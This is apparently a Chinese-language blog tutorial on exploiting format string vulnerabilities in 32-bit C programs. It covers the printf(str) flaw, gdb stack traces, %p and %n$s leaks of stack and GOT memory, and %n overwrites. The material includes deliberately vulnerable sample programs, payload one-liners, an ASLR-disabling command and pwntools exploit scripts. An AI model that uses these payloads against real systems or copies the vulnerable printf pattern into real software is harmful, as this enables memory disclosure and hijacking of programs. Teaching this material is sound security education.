---
title: "Format String Vulnerability"
Categories:
    - Pwn
tag: 
    - Pwn
    - Format_string
---

## 写在开头

格式化字符串漏洞就是通过控制格式化函数参数的内容来利用格式化函数泄露或修改进程内容，以此达到获取进程信息或控制进程走向的目的。会触发该漏洞的函数很有限，主要就是 printf、fprintf、sprintf 等等C库中 print 家族的函数。

<!-- more -->

这里就用32位 printf() 举例了，其它情况可以此类推。我们知道 printf() 正常用法是

```c
char str[20];
printf("%s", str);
```

然后有人却要这么用（有点不理解为什么会有人这么用，想偷懒 puts() 不是更懒嘛）

```c
char str[20];
printf(str);
```

然后我们想想如果 str[] 能被使用者控制。

```c
char str[20];
scanf("%s", str);
printf(str);
```

下面看看运行结果：

```text
$ ./a.out
%p.%p.%p.%p
0xffebd818.0xf7ed0000.0xf7d361f0.0x1
```

## 漏洞原理

现在我们说这奇怪现象出现的原因与其背后的具体原理。

首先我们知道，[格式化函数](#附录A：常见格式化函数)可以接受可变数量的参数，并将根据格式化字符串中的[格式化占位符](#格式化占位符)将随后的零个或多个函数参数转换为相应的格式并替换掉格式化占位符。

在 printf() 函数中会将第一个参数当作格式化字符串，第二个及其以后的参数会按照格式化字符串中的格式化占位符来转换然后替换掉格式化占位符。

现在，我们的 printf() 的格式化字符串是被使用者控制的，我们没有向格式化函数传递参数，如果使用者在输入中输入格式化占位符，printf() 会如何处理使用者输入的格式化字符串呢？

虽然我们并没有向 printf() 传递参数，但是 printf() 依然会正常处理出格式化字符串，从堆栈中按序拿出数据，按着格式化占位符转换位相应格式替换掉格式化占位符。

用 gdb 调试程序，输入 `%p.%p.%p.%p`，运行到  call <printf\@plt>。

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd038 ("%p.%p.%p.%p")
EBX: 0x0
ECX: 0x1
EDX: 0xf7fb487c --> 0x0
ESI: 0xf7fb3000 --> 0x1b1db0
EDI: 0xf7fb3000 --> 0x1b1db0
EBP: 0xffffd058 --> 0x0
ESP: 0xffffd020 --> 0xffffd038 ("%p.%p.%p.%p")
EIP: 0x80484f2 (<main+55>   call   0x8048370 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484eb <main+48>: sub    esp,0xc
   0x80484ee <main+51>: lea    eax,[ebp-0x20]
   0x80484f1 <main+54>: push   eax
=> 0x80484f2 <main+55>: call   0x8048370 <printf@plt>
   0x80484f7 <main+60>: add    esp,0x10
   0x80484fa <main+63>: mov    eax,0x0
   0x80484ff <main+68>: mov    edx,DWORD PTR [ebp-0xc]
   0x8048502 <main+71>: xor    edx,DWORD PTR gs:0x14
Guessed arguments:
arg[0]: 0xffffd038 ("%p.%p.%p.%p")
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 --> 0xffffd038 ("%p.%p.%p.%p")
0004| 0xffffd024 --> 0xffffd038 ("%p.%p.%p.%p")
0008| 0xffffd028 --> 0xf7fb3000 --> 0x1b1db0
0012| 0xffffd02c --> 0xf7e191f0 (<init_cacheinfo+352>:  mov    DWORD PTR [esp+0x4],eax)
0016| 0xffffd030 --> 0x1
0020| 0xffffd034 --> 0x0
0024| 0xffffd038 ("%p.%p.%p.%p")
0028| 0xffffd03c ("p.%p.%p")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080484f2 in main ()
gdb-peda$
```

现在我们注意一下堆栈中前5个数据，分别是 0xffffd038、0xffffd038、0xf7fb3000、0xf7e191f0、0x1。第一个是指向我们的格式化字符串，我们不在意，记着后面4个数据，然后按c继续运行。

```text
gdb-peda$ c
Continuing.
0xffffd038.0xf7fb3000.0xf7e191f0.0x1
```

我们可以清楚的看到输出的正是我们堆栈中的内容。巧合吗？按着 cdecl 调用约定，函数之间的参数会从右到左依次压入到堆栈中。所以 printf() 就将格式化字符串后面跟着的数据当作参数处理了。

## 格式化字符串漏洞利用

知道漏洞原理了，现在考虑这个漏洞能用在哪些方面。

### 使程序崩溃

这个应用很简单，就是用 %s 来输出信息，当输出地址不合法时程序自然就崩了。

```c
printf("%s%s%s%s%s%s%s%s%s%s");
```

### 泄露堆栈内存

在前面原理中其实我们已经实现了依次泄露出堆栈中信息的方法，也就是用 `%p`（也可以用其它啊，只要你能拿到数据，用什么随你便）来写格式化字符串。

现在我们改进一下，加上 n$ 来不按顺序获取堆栈内存。毕竟我们输入格式化字符串很多时候是有限的，但是我们需要的数据却在堆栈中很深的地方。

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd038 ("%7$p")
EBX: 0x0
ECX: 0x1
EDX: 0xf7fb487c --> 0x0
ESI: 0xf7fb3000 --> 0x1b1db0
EDI: 0xf7fb3000 --> 0x1b1db0
EBP: 0xffffd058 --> 0x0
ESP: 0xffffd020 --> 0xffffd038 ("%7$p")
EIP: 0x80484f2 (<main+55>:  call   0x8048370 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80484eb <main+48>: sub    esp,0xc
   0x80484ee <main+51>: lea    eax,[ebp-0x20]
   0x80484f1 <main+54>: push   eax
=> 0x80484f2 <main+55>: call   0x8048370 <printf@plt>
   0x80484f7 <main+60>: add    esp,0x10
   0x80484fa <main+63>: mov    eax,0x0
   0x80484ff <main+68>: mov    edx,DWORD PTR [ebp-0xc]
   0x8048502 <main+71>: xor    edx,DWORD PTR gs:0x14
Guessed arguments:
arg[0]: 0xffffd038 ("%7$p")
[------------------------------------stack-------------------------------------]
0000| 0xffffd020 --> 0xffffd038 ("%7$p")
0004| 0xffffd024 --> 0xffffd038 ("%7$p")
0008| 0xffffd028 --> 0xf7fb3000 --> 0x1b1db0
0012| 0xffffd02c --> 0xf7e191f0 (<init_cacheinfo+352>:  mov    DWORD PTR [esp+0x4],eax)
0016| 0xffffd030 --> 0x1
0020| 0xffffd034 --> 0x0
0024| 0xffffd038 ("%7$p")
0028| 0xffffd03c --> 0x8048500 (<main+69>:  push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080484f2 in main ()
gdb-peda$
```

这里我们输入的是 %7$p，所以我们注意第堆栈中第8个数，0x8048500。

```text
gdb-peda$ c
Continuing.
0x8048500
```

除泄露堆栈上数据外，其实我们还经常使用 %n$s 来泄露堆栈上变量所指向的字符串，原理同上，不过要小心我们前面说的 %s 解析无意义的地址时程序会崩溃的问题。

这种利用方法一个常用的地方就是泄漏 Canary，以此来绕过 Canary 保护。

### 泄露任意地址内存

上面的方法还是有一定局限性，我们再扩展一下，使其能泄露任意地址内存。

我们知道，堆栈上不仅保存着参数，其实局部变量也是存放在堆栈上面的。如果我们能控制局部变量，将其控制成我们想要获得的内存的地址，再通过使用上面讲到的 %n$s 来将该地址的内容以字符串的形式泄露出来。

还是用上面那个函数来举例演示一下。这个程序中我们控制的格式化字符串就是一个局部变量，那么我们就可以将想泄漏内存的地址放在局部变量中然后 %s 将内存打印出来。所以我们将格式化字符串修改为 \<addr>%n$s。

其中 n 为我们用来保存格式化字符串的局部变量相对于传递给格式化函数的格式化字符串参数偏移的参数位置个数（好绕啊，简化一点说就是局部变量距离参数多远），现在我们考虑一下如何获得这个值的大小。我们再修改一下格式化字符串，修改后为 \<tag>%p%p%p%p%p%p…… 或者 \<tag>%n$p。用上面的程序试验一下：

```text
$ ./a.out
aaaa%p.%p.%p.%p.%p.%p
*** stack smashing detected ***: ./a.out terminated
aaaa0xffd08108.0xf7eec000.0xf7d521f0.0x1.(nil).0x61616161
```

嗯，0x61616161 异常的亲切啊，这不正是 aaaa 的 ASCII 码嘛。不信？那再试一次。

```text
$ ./a.out
kkkk.%6$p
kkkk.0x6b6b6b6b
```

0x6b6b6b6b 是不是也很熟悉。好现在知道 n 的值为6了。那么我们尝试泄漏一下 GOT。（注：我是关了 ASLR 的，我毕竟是个懒人：sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"）

```shell
$ readelf -r a.out

Relocation section '.rel.dyn' at offset 0x30c contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x314 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

这里我们泄漏 <__isoc99_scanf\@plt>。需要说明的一点是我们是没法泄露 <printf\@plt> 的，原因是 scanf() 会对 \x00 \x09 \x0a \x0b \x0c \x0d \x20 7个特殊字符进行特殊处理，有兴趣的可以自己查查弄弄。

```shell
$ python -c 'print("\x18\xA0\x04\x08" + ".%6$s")' > text
$ ./a.out < text > out
```

输出的数据如下：

```text
$ python -c 'print repr(raw_input())' < out
'\x18\xa0\x04\x08.\xc0\xd0\xe5\xf7'
```

嗯，<__isoc99_scanf\@plt> 地址就是 0xf7e5d0c0。

好，泄漏方法我们知道了，现在说点需要注意的：不是每次我们都运气这么好，偏移正好是机器字长的整倍数，所以有些时候我们需要再 \<addr> 前面加上 \<padding>，至于加多少视情况自己定。还有就是别只是能泄漏 GOT，而是可以泄漏 __任意地址__ 内存，比如用来将进程直接给 dump 出来。

### 覆盖任意地址内存

这里就用到前面格式化占位符中说到的 %n 来实现覆盖这个功能，另外还要用 [field width] 来保证修改的值，用 n$ 来保证修改的变量的位置。

我们先稍微修改一下程序：

```c
// gcc -m32 vuln.c
#include <stdio.h>

int flag = 0x77;

int main()
{
    char str[20];
    scanf("%s", str);
    printf(str);
    if (flag == 0x6b)
        puts("Success!");

    return 0;
}
```

我们的格式化字符串 \<addr>……%n$n，是不是和泄漏任意地址内存中用到的很像，其实也就是把读改成写，然后因为 %n 是填入变量的是正确输出字符数个数，所以在 %n 之前输出相应个数个字符。

现在我们先要知道要修改的内存的地址是多少，这里我们目标地址为 0x804a028。

```text
$ objdump -s -j .data a.out

a.out:     file format elf32-i386

Contents of section .data:
 804a020 00000000 00000000 77000000           ........w...
```

获取偏移的方法看泄漏任意地址内存中讲的。那么现在我们的格式化字符串是 `\x28\xa0\x04\x08%4$103d%6$n`。

大致说一下格式化字符串的结构把，前4个字节是目标地址没问题。中间 `%4$103d` 就是输出103个字符，4$ 是我随便找的一个变量，103 是因为前面我们已经输出4个字符了，0x6b-0x04 = 107-4 = 103。最后 %6$n 写明目标地址。

```text
$ python -c 'print "\x28\xa0\x04\x08" + "%4$103d%6$n"' > text
$ ./a.out < text
(�                                                                                                      1Success!
```

然后再说一个，这里是一次性写4个字节，如果我们想写其它大小个字节呢。这时我们就会用到格式化占位符中的 [Length]。这里我们用写一个字节举例：将上面 vuln 程序的条件改为 flag == 0x7777，格式化字符串则为 `\x29\xa0\x04\x08%4$115d%6$hhn`。

```text
$ python -c 'print "\x29\xa0\x04\x08" + "%4$115d%6$hhn"' > text
$ ./a.out < text
)�                                                                                                                  1Success!
```

## 写在最后

上面是关闭 ASLR、x86 程序的情况，x86_64 程序的利用类推就行。只要注意在 Linux 下它前6个参数通过 rdi、rsi、rdx、rcx、r8、r9 6个寄存器传递，Windows 下前4个参数通过 rcx、rdx、r8、r9 来传递。

## 附录A：常见格式化函数

| 函数 | 基本介绍 |
| --- | --- |
| int printf(const char *format, ...); | 输出到标准输出 stdout |
| int fprintf(FILE *stream, const char *format, ...); | 输出到指定 FILE 流 |
| int sprintf(char *str, const char *format, ...); | 输出到字符串 |
| int snprintf(char *str, size_t size, const char *format, ...); | 长度检测后输出到字符串 |
| int vprintf(const char *format, va_list arg); | 使用参数列表输出到标准输出 stdout。 |
| int vfprintf(FILE *stream, const char *format, va_list arg); | 使用参数列表输出到流 stream 中 |
| int vsprintf(char *str, const char *format, va_list arg); | 使用参数列表输出到字符串 |
| int vsnprintf(char *str, size_t size, const char *format, va_list arg); | 长度检测后使用参数列表输出到字符串 |

格式化函数不只是用来输出，另外还有像：scanf、setproctitle、syslog、err、verr、warn、vwarn、……

## 附录B：常用格式化占位符

格式化占位符（format placeholder）也就是我们以往用到的 %d、%x、%c、%s、……，其具体语法如下:

> %[parameter][flags][field width][.precision][length]type

这里只列出下面将用到的几个，其它可看[Wikipedia](https://en.wikipedia.org/wiki/Printf_format_string)。

先是 [parameter] 的 n$，用来指明是第几个参数。例如：`printf("%2$c", 'a', 'b', 'c');` 输出出来的就是 `b`。

[flag] 先不管，[field width] 是用来给出显示数值的最小宽度，正常情况下一般是用于制表输出时填充固定宽度的表目，而我们则是结合 %n 来进行修改内存的操作。例子如下：

```c
int i;
printf("%10d%n\n", 1, &i);
printf("i = %d", i);
```

运行效果

```text
$ ./a.out
         1
i = 10
```

[.precision] 也先不管， [length] 用来指出浮点型参数或整型参数的长度。用法就和 [type] 一起演示了。

[type] 中的%d、%x、%c、%s、%p、……我想就不用多说了吧，这里就只说一下 %n。如上面所见，它的作用就是把已经成功输出字符的个数写入对应的整型指针参数所指向的变量中。

```c
#include <stdio.h>

int main()
{
    int i = 0x12345678;

    printf("%7c%hhn\n", 'k', (char*)&i);
    printf("%#x\n", i);
    printf("%7c%n\n", 'k', &i);
    printf("%#x\n", i);

    return 0;
}
```

```text
$ ./a.out
      k
0x12345607
      k
0x7
```

## 附录C：pwntools pwnlib.fmtstr 模块

这个模块很简单，就两个内容，一个自动化利用，一个格式化字符串生成。

### 自动化利用

FmtStr (execute_fmt, offset = None, padlen = 0, numbwritten = 0)

execute_fmt (function): 这个参数是一个函数，用来实现向 vuln 程序发送一段格式化字符串，然后返回程序根据这段格式化字符串打印出来的信息。函数应带有一个参数，该参数即为格式化字符串。

offset (int): 这个参数就是你输入的格式化字符串与格式化函数参数的偏移，没有也没关系，FmtStr 能自己弄出来，但知道是多少时还是填上吧，省时间。

padlen (int): 需要在格式化字符串之前添加的 pad 大小。

numbwritten (int): 在输入格式化字符串之前你还输入了多少，确保 %n 进去的值正确。

下面用这个程序做个示范：

```c
#include <stdio.h>
#include <stdbool.h>

int flag = 0x77;

int main()
{
    char str[100];

    setbuf(stdout, NULL);

    while (true) {
        scanf("%s", str);
        printf(str);
        if (flag == 0x6b) {
            puts("Success!");
            break;
        }
    }

    return 0;
}
```

```python
#!/usr/bin/python
from pwn import *

io = process("./a.out")

def exec_fmt(payload):
    print payload
    io.sendline(payload)
    data = io.recv()
    print data
    return data

fmt_str = FmtStr(exec_fmt)
fmt_str.write(0x804a02c, 0x6b)
fmt_str.execute_writes()

io.close()
```

### 生成格式化字符串

fmtstr_payload (offset, writes, numbwritten = 0, write_size ='byte')

offset (int): 你输入的格式化字符串与格式化函数参数的偏移。

writes (dict): 一个保存你想写的地址与想写入的值的字典，形如：{addr: value, addr2: value2}

numbwritten (int): 在格式化字符串之前你已经写入的字符数目。

write_size (int): 每次写入多少字节，默认1字节，选项有 byte(%hhn)、short(%hn)、int(%n)

```python
$ python
>>> import pwn
>>> print repr(pwn.fmtstr_payload(6, {0x804a02c: 0x6b}, write_size='int'))
',\xa0\x04\x08%103c%6$n'
>>>
```

## 参考资料

+ Hcamael. [Linux系统下格式化字符串利用研究](https://0x48.pw/2017/03/13/0x2c/)
+ explorer. [格式化字符串漏洞简介](http://www.anquan.us/static/drops/binary-7714.html)
+ CTF_Wiki. [格式化字符串漏洞](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/)
+ firmianay. [格式化字符串漏洞](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html)
+ Wikipedia. [printf format string](https://en.wikipedia.org/wiki/Printf_format_string)
+ pwntools. [pwnlib.fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)
+ longld. [Exploiting Sudo format string vunerability](https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html)
+ scut. [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)